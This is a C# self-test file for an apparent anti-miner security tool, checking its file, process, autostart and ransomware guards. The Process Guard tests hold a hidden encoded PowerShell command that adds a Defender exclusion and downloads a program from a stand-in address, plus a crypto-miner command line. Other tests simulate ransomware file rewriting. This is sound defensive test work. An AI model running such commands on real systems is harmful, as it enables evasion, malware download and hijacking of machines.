using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using MineHunter.Guards;
using MineHunter.Model;
using MineHunter.Native;
using MineHunter.Rules;
using MineHunter.Util;

namespace MineHunter
{
    public static partial class SelfTest
    {
        static bool WaitFor(Func<bool> cond, int ms) { var sw = System.Diagnostics.Stopwatch.StartNew(); while (sw.ElapsedMilliseconds < ms) { if (cond()) return true; Thread.Sleep(100); } return cond(); }

        // ============================================================================================ File Guard, Download Guard, Process Guard
        static void GuardFileChecks(RulePack rules)
        {
            W.WriteLine("\nReal-time layer: File Guard, Download Guard, Process Guard (benign lab files only)");
            string tmp = NewTemp("mh_fg_");
            try
            {
                string notepad = Path.Combine(PathUtil.System32, "notepad.exe");
                var alerts = new List<GuardAlert>();
                var g = TestGuardCtx(rules, alerts, Path.Combine(RulePack.DataDir, "j-fg.json"));
                var fg = new FileGuard(true) { Settle = TimeSpan.FromMilliseconds(300) };
                fg.StartOn(g, new[] { new KeyValuePair<string, bool>(tmp, true) });
                Check("File Guard reports that it is watching", fg.Status.State == GuardState.On && fg.Status.Detail.Length > 0);

                string good = Path.Combine(tmp, "calc_copy.exe"); File.Copy(notepad, good);
                var a0 = fg.CheckOne(good, DateTime.Now);
                Check("an ordinary unsigned program with nothing suspicious in it raises no alert (an unknown file is not an alarm)", a0 == null && alerts.Count == 0);
                string sys = Path.Combine(PathUtil.System32, "cmd.exe");
                Check("a Microsoft-signed file raises no alert", fg.CheckOne(sys, DateTime.Now) == null && alerts.Count == 0);

                string bad = Path.Combine(tmp, "free_game_setup.exe");
                File.WriteAllBytes(bad, File.ReadAllBytes(notepad).Concat(Encoding.ASCII.GetBytes("\n" + MinerWords() + "\n")).ToArray());
                var a1 = fg.CheckOne(bad, DateTime.Now);
                Check("a program carrying several miner markers is reported with its reasons and the honest 'noticed after it appeared' wording", a1 != null && a1.Level >= AlertLevel.Suspicious && a1.Reasons.Count > 0 && a1.Path == bad && a1.Sha256 == Hashing.Sha256(bad) && a1.Text.IndexOf("does not stop", StringComparison.OrdinalIgnoreCase) >= 0 || a1 != null && a1.Text.IndexOf("не мешает", StringComparison.OrdinalIgnoreCase) >= 0, a1 == null ? "no alert" : a1.Level + " " + a1.Text);
                Check("a second look at the same unchanged file is not repeated", fg.CheckOne(bad, DateTime.Now) == null);

                // through the real file-system watcher, with a file that appears while the guard runs
                string bad2 = Path.Combine(tmp, "sub", "another_setup.exe"); Directory.CreateDirectory(Path.GetDirectoryName(bad2));
                int before = fg.Checked; int alertsBefore = alerts.Count;
                File.WriteAllBytes(bad2 + ".crdownload", new byte[] { 1 });                       // a partial download is ignored
                File.WriteAllBytes(bad2, File.ReadAllBytes(notepad).Concat(Encoding.ASCII.GetBytes("\n" + MinerWords() + "\n")).ToArray());
                bool seen = WaitFor(() => alerts.Count > alertsBefore, 20000);
                Check("a new file that appears in a watched folder is noticed by the watcher, waited for until it is complete, and checked", seen && fg.Checked > before && alerts.Last().Path == bad2, "checked " + fg.Checked + ", alerts " + alerts.Count);
                fg.Stop();
                Check("stopping the guard stops the watcher", fg.Status.State == GuardState.Off);
                Check("the places File Guard watches include the Downloads folder of the user", new FileGuard(true).Places().Any(p => p.Key.EndsWith("Downloads", StringComparison.OrdinalIgnoreCase)) && new FileGuard(false).Places().Count > new FileGuard(true).Places().Count);
                Check("only the file types that matter are watched (programs, scripts, shortcuts, archives, images)", FileGuard.IsWatchedFile("a.exe") && FileGuard.IsWatchedFile("a.PS1") && FileGuard.IsWatchedFile("a.lnk") && FileGuard.IsWatchedFile("a.iso") && !FileGuard.IsWatchedFile("a.jpg") && !FileGuard.IsWatchedFile("a.txt") && !FileGuard.IsWatchedFile("noext"));

                // ---- Process Guard
                var alerts2 = new List<GuardAlert>(); var g2 = TestGuardCtx(rules, alerts2, Path.Combine(RulePack.DataDir, "j-pg.json"));
                var pg = new ProcessGuard { SourceFactory = () => new ManualProcessSource() }; pg.Start(g2);
                string ps = Path.Combine(PathUtil.System32, @"WindowsPowerShell\v1.0\powershell.exe");
                string enc = Convert.ToBase64String(Encoding.Unicode.GetBytes("Add-MpPreference -ExclusionPath 'C:\\ProgramData'; (New-Object Net.WebClient).DownloadFile('http://203.0.113.7/a.exe','x.exe')"));
                g2.Processes.Add(new ProcRec { Pid = 9001, Name = "WINWORD", Path = @"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", Started = DateTime.Now });
                pg.Handle(new ProcRec { Pid = 9002, ParentPid = 9001, Name = "powershell", Path = ps, Cmd = "powershell.exe -NoP -W Hidden -enc " + enc, Started = DateTime.Now });
                Check("Word starting a hidden PowerShell with an encoded command that edits Defender's exclusions is reported, naming Word as the source", alerts2.Count >= 1 && alerts2.Last().Level >= AlertLevel.Suspicious && alerts2.Last().Text.IndexOf("WINWORD", StringComparison.OrdinalIgnoreCase) >= 0 && alerts2.Last().Reasons.Count >= 2, (alerts2.Count == 0 ? "no alert" : alerts2.Last().Level + " " + alerts2.Last().Text) + " || " + pg.LastDecision);

                int n = alerts2.Count;
                string explorer = Path.Combine(PathUtil.WinDir, "explorer.exe");
                g2.Processes.Add(new ProcRec { Pid = 9010, Name = "explorer", Path = explorer, Started = DateTime.Now });
                pg.Handle(new ProcRec { Pid = 9011, ParentPid = 9010, Name = "powershell", Path = ps, Cmd = "powershell.exe -NoProfile -Command Get-Process | Sort CPU", Started = DateTime.Now });
                pg.Handle(new ProcRec { Pid = 9012, ParentPid = 9010, Name = "powershell", Path = ps, Cmd = "powershell.exe -Command Add-MpPreference -ExclusionPath 'D:\\Games'", Started = DateTime.Now });
                pg.Handle(new ProcRec { Pid = 9013, ParentPid = 9010, Name = "cmd", Path = Path.Combine(PathUtil.System32, "cmd.exe"), Cmd = "cmd.exe /c dir C:\\ && echo done", Started = DateTime.Now });
                Check("a person typing into PowerShell or cmd from Explorer (even a Defender exclusion) is not an alert: the whole chain is Microsoft's", alerts2.Count == n);

                string miner = Obf.J("stra", "tum+tcp://pool.example.invalid:3333") + " -u 49WalletNotReal -p x --" + Obf.J("don", "ate-level") + " 1 -a " + Obf.J("r", "x/0");
                pg.Handle(new ProcRec { Pid = 9020, ParentPid = 9010, Name = "powershell", Path = ps, Cmd = "powershell.exe -c .\\runner.exe -o " + miner, Started = DateTime.Now });
                Check("a complete miner command line is reported even when started by a trusted shell", alerts2.Count == n + 1 && alerts2.Last().Level == AlertLevel.Dangerous, alerts2.Count == n ? "no alert" : alerts2.Last().Level.ToString());

                // an unknown program from Temp with a miner command line and miner content
                string dropper = Path.Combine(tmp, "svc_update.exe"); File.WriteAllBytes(dropper, File.ReadAllBytes(notepad).Concat(Encoding.ASCII.GetBytes("\n" + MinerWords() + "\n")).ToArray());
                int m = alerts2.Count;
                pg.Handle(new ProcRec { Pid = 9030, ParentPid = 9010, Name = "svc_update", Path = dropper, Cmd = "\"" + dropper + "\" -o " + miner, Started = DateTime.Now });
                Check("an unknown program from Temp that carries miner markers and a pool on its command line is reported as dangerous", alerts2.Count > m && alerts2.Last().Level == AlertLevel.Dangerous && alerts2.Last().Path == dropper, alerts2.Count == m ? "no alert" : alerts2.Last().Level + " " + alerts2.Last().Text);
                int m2 = alerts2.Count;
                string plainCopy = Path.Combine(tmp, "plain_tool.exe"); File.Copy(notepad, plainCopy);
                pg.Handle(new ProcRec { Pid = 9040, ParentPid = 9010, Name = "plain_tool", Path = plainCopy, Cmd = "\"" + plainCopy + "\" --version", Started = DateTime.Now });
                Check("an unsigned program from a user folder with nothing else wrong is not an alert", alerts2.Count == m2 || alerts2.Last().Level == AlertLevel.Info);
                pg.Stop();
                Check("Process Guard reports its source and state, and falls back to a limited mode instead of failing", pg.Status.State == GuardState.Off && !string.IsNullOrEmpty(new PollingProcessSource().Mode));
            }
            finally { try { Directory.Delete(tmp, true); } catch { } }
        }

        sealed class ManualProcessSource : IProcessSource
        {
            public event Action<ProcStart> Started;
            public string Mode { get { return "manual"; } }
            public void Start() { }
            public void Dispose() { }
        }

        // ============================================================================================ Persistence Guard, Ransomware Guard, the host
        static void GuardSystemChecks(RulePack rules)
        {
            W.WriteLine("\nReal-time layer: Persistence Guard, Ransomware Guard, the guard host");
            string tmp = NewTemp("mh_pg_");
            string keyPath = @"Software\MineHunterSelfTest\GuardRun";
            try
            {
                string notepad = Path.Combine(PathUtil.System32, "notepad.exe");
                var alerts = new List<GuardAlert>(); var g = TestGuardCtx(rules, alerts, Path.Combine(RulePack.DataDir, "j-pers.json"));
                var spec = new WatchSpec
                {
                    Kind = "run", Title = "Run (test key)",
                    Snapshot = () =>
                    {
                        var d = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                        using (var k = Registry.CurrentUser.OpenSubKey(keyPath)) if (k != null) foreach (var nme in k.GetValueNames()) d[nme] = Convert.ToString(k.GetValue(nme));
                        return d;
                    }
                };
                Registry.CurrentUser.CreateSubKey(keyPath).Dispose();
                var pg = new PersistenceGuard { Interval = TimeSpan.FromHours(1) }; pg.AddSpec(spec); pg.Start(g);

                string evil = Path.Combine(tmp, "updater.exe"); File.WriteAllBytes(evil, File.ReadAllBytes(notepad).Concat(Encoding.ASCII.GetBytes("\n" + MinerWords() + "\n")).ToArray());
                using (var k = Registry.CurrentUser.CreateSubKey(keyPath)) k.SetValue("Updater", "\"" + evil + "\" --silent");
                var ch = pg.CheckNow();
                Check("a new autostart entry is noticed", ch.Count == 1 && ch[0].Added && ch[0].Key == "Updater");
                Check("an autostart entry that starts an unknown program carrying miner markers is reported, naming the program", alerts.Count == 1 && alerts[0].Level >= AlertLevel.Suspicious && alerts[0].Path == evil && alerts[0].Text.Contains("updater.exe"), alerts.Count == 0 ? "no alert" : alerts[0].Level + " " + alerts[0].Text);
                Check("the change is also written to the journal of system changes", g.Journal.List().Any(e => e.Kind == "run" && e.Text.Contains("Updater")));

                using (var k = Registry.CurrentUser.CreateSubKey(keyPath)) k.SetValue("Notepad", "\"" + notepad + "\"");
                int n = alerts.Count; pg.CheckNow();
                Check("a trusted Microsoft program registering itself for autostart is only written to the journal", alerts.Count == n && g.Journal.List().Any(e => e.Text.Contains("Notepad")));
                string plain = Path.Combine(tmp, "mytool.exe"); File.Copy(notepad, plain);
                using (var k = Registry.CurrentUser.CreateSubKey(keyPath)) k.SetValue("MyTool", "\"" + plain + "\"");
                int n2 = alerts.Count; pg.CheckNow();
                Check("an unknown unsigned program from a user folder that merely adds itself to autostart is at most a note, not a warning", alerts.Count == n2 || alerts.Last().Level == AlertLevel.Info);
                using (var k = Registry.CurrentUser.OpenSubKey(keyPath, true)) k.DeleteValue("Updater");
                var ch2 = pg.CheckNow();
                Check("a removed entry is noticed and journaled", ch2.Any(c => c.Removed && c.Key == "Updater"));
                pg.Stop();
                Check("the default watch list covers Run keys, Startup folders, tasks, services, Defender exclusions, hosts, firewall rules, WMI and PowerShell profiles", PersistenceGuard.DefaultSpecs().Select(s => s.Kind).Distinct().Count() >= 9);
                bool allRead = true; foreach (var s in PersistenceGuard.DefaultSpecs()) { try { s.Snapshot(); } catch { allRead = false; } }
                Check("every default watch point can be read on this PC without an error", allRead);

                // Ransomware Guard on a folder of its own, with real file events
                string rdir = Path.Combine(tmp, "docs"); Directory.CreateDirectory(rdir);
                for (int i = 0; i < 3; i++) Directory.CreateDirectory(Path.Combine(rdir, "d" + i));
                var alerts3 = new List<GuardAlert>(); var g3 = TestGuardCtx(rules, alerts3, Path.Combine(RulePack.DataDir, "j-rg.json"));
                var rg = new RansomwareGuard();
                rg.StartOn(g3, new[] { rdir }, true);
                string canary = Path.Combine(rdir, RansomwareGuard.CanaryName);
                Check("a decoy file is placed in the folder (hidden, a valid document), nothing else is touched", File.Exists(canary) && (File.GetAttributes(canary) & FileAttributes.Hidden) != 0 && rg.Detector.CanaryCount == 1 && Directory.GetFiles(rdir, "*", SearchOption.AllDirectories).Length == 1);
                var files = new List<string>();
                for (int i = 0; i < 24; i++) { string f = Path.Combine(rdir, "d" + (i % 3), "report" + i + ".docx"); File.WriteAllText(f, "document " + i); files.Add(f); }
                Thread.Sleep(600);
                foreach (var f in files) { File.WriteAllText(f, new string('#', 400)); File.Move(f, f + ".locked"); }       // what an encryptor does: rewrite, rename
                for (int i = 0; i < 3; i++) File.WriteAllText(Path.Combine(rdir, "d" + i, "README_TO_DECRYPT.txt"), "pay");
                File.Move(canary, canary + ".locked");
                Thread.Sleep(1500);
                var ra = rg.Evaluate(DateTime.Now, () => new List<KeyValuePair<int, ulong>> { new KeyValuePair<int, ulong>(4242, 9999999) }, p => @"C:\Users\Test\AppData\Local\Temp\crypt.exe", p => false);
                Check("files rewritten and renamed to one unknown extension in three folders, ransom notes and a touched decoy: dangerous, with the writing program named and a freeze offered", ra != null && ra.Level == AlertLevel.Dangerous && ra.Pid == 4242 && ra.Text.Contains("crypt.exe") && alerts3.Contains(ra), ra == null ? "no alert (events: canary " + rg.Detector.CanaryCount + ")" : ra.Level + " " + ra.Text);
                rg.Stop();
                File.Move(canary + ".locked", canary);
                RansomwareGuard.RemoveCanaries(new[] { rdir });
                Check("the decoy file is removed again when the guard is switched off", !File.Exists(canary));
            }
            finally
            {
                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\MineHunterSelfTest", false); } catch { }
                try { Directory.Delete(tmp, true); } catch { }
            }

            // the host
            var s2 = new Settings { FileGuard = false, DownloadGuard = false, ProcessGuard = false, ScriptGuard = true, PersistenceGuard = false, NetworkGuard = false, UsbGuard = true, RansomwareGuard = false };
            var host = new GuardHost(s2);
            host.Apply();
            var st = host.Statuses();
            Check("the host lists all eight components with their states, and starts only the ones that are switched on", st.Count == 8 && st.Count(x => x.State == GuardState.On) == 2 && st.Count(x => x.State == GuardState.Off) == 6 && st.All(x => !string.IsNullOrEmpty(x.StateText)));
            var got = new List<GuardAlert>(); host.AlertRaised += a => got.Add(a);
            host.Ctx.Settings.NotifyLevel = "Dangerous";
            host.Ctx.Alert(new GuardAlert { Guard = "file", Level = AlertLevel.Suspicious, Title = "x", Text = "y" });
            host.Ctx.Alert(new GuardAlert { Guard = "file", Level = AlertLevel.Dangerous, Title = "x2", Text = "y2" });
            Check("the notification level the user chose decides what is shown (here: only 'Dangerous')", got.Count == 1 && got[0].Title == "x2" && host.Recent.Count == 1);
            host.Stop();
            Check("alerts are kept on disk for the 'recent findings' list", GuardHost.LoadAlerts().Any(a => a.Title == "x2"));
            Check("the game mode answer is a plain yes/no and does not throw", SystemState.FullScreenAppActive() || !SystemState.FullScreenAppActive());
            Check("the quarantine action refuses a missing file and the allow action refuses an unreadable one", GuardHost.QuarantineFile(Path.Combine(Path.GetTempPath(), "nope-" + Guid.NewGuid().ToString("N") + ".exe"), "t") != null && GuardHost.Allow(Path.Combine(Path.GetTempPath(), "nope-" + Guid.NewGuid().ToString("N") + ".exe")) != null);
            Check("freezing or stopping a system process id (0-4) is refused", !GuardHost.Freeze(4) && GuardHost.Terminate(4) != null);
        }
    }
}
